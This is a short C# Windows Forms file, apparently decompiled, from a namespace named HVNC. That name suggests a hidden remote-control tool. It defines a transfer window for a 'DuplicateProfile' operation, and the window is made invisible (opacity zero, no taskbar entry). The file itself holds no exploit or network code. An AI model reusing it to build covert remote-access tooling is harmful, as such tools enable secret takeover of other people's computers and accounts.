

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace HVNC
{
  public class FrmTransfer : Form
  {
    public int int_0;
    private IContainer components;
    private ProgressBar DuplicateProgess;
    private Label FileTransferLabel;
    private Label PingTransform;

    public ProgressBar DuplicateProgesse
    {
      get => this.DuplicateProgess;
      set => this.DuplicateProgess = value;
    }

    public Label FileTransferLabele
    {
      get => this.FileTransferLabel;
      set => this.FileTransferLabel = value;
    }

    public Label PingTransfor
    {
      get => this.PingTransform;
      set => this.PingTransform = value;
    }

    public FrmTransfer()
    {
      this.int_0 = 0;
      this.InitializeComponent();
    }

    private void FrmTransfer_Load(object sender, EventArgs e)
    {
    }

    public void DuplicateProfile(int int_1)
    {
      if (int_1 > this.int_0)
        int_1 = this.int_0;
      this.FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(this.int_0) + " MB";
      this.DuplicateProgess.Value = int_1;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmTransfer));
      this.DuplicateProgess = new ProgressBar();
      this.FileTransferLabel = new Label();
      this.PingTransform = new Label();
      this.SuspendLayout();
      this.DuplicateProgess.Location = new Point(12, 12);
      this.DuplicateProgess.Name = "DuplicateProgess";
      this.DuplicateProgess.Size = new Size(453, 23);
      this.DuplicateProgess.TabIndex = 1;
      this.FileTransferLabel.AutoSize = true;
      this.FileTransferLabel.Location = new Point(225, 44);
      this.FileTransferLabel.Name = "FileTransferLabel";
      this.FileTransferLabel.Size = new Size(37, 13);
      this.FileTransferLabel.TabIndex = 4;
      this.FileTransferLabel.Text = "Status";
      this.PingTransform.AutoSize = true;
      this.PingTransform.Location = new Point((int) byte.MaxValue, 44);
      this.PingTransform.Name = "PingTransform";
      this.PingTransform.Size = new Size(95, 13);
      this.PingTransform.TabIndex = 5;
      this.PingTransform.Text = "Ping: Measuring....";
      this.PingTransform.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(475, 66);
      this.Controls.Add((Control) this.FileTransferLabel);
      this.Controls.Add((Control) this.DuplicateProgess);
      this.Controls.Add((Control) this.PingTransform);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FrmTransfer);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Load += new EventHandler(this.FrmTransfer_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
